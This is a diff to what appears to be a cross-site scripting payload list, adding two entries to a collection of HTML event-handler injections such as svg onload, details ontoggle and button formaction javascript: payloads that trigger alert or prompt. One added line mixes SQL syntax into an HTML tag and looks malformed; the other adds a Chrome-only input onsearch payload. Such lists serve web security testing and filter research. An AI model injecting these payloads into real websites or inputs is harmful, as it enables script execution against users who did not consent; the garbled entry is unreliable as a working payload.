@@ -85,6 +85,7 @@ autofocus onfocus=window.onerror=alert;throw/1/;//
 <iframe/onload=alert(1)>
 <svg/onload=prompt(1)>
 <svg onload=alert(1)>
+<select * from autofocus where onfocus="alert(1)";
 
 "style=background:black; onmouseover=alert(1)"
 "autofocus/onfocus="alert(1)
@@ -107,6 +108,7 @@ strukt" accesskey="X" onclick="alert(document.domain) //ALT+SHIFT+X to trigger, 
 <form><button formaction="javascript:alert(1)">		 
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)"> // Firefox only
 <details ontoggle=alert(1)> //Chrome only
+<input type="search" onsearch="prompt(1)"  autofocus> //Chrome only
 					 
 					 
 
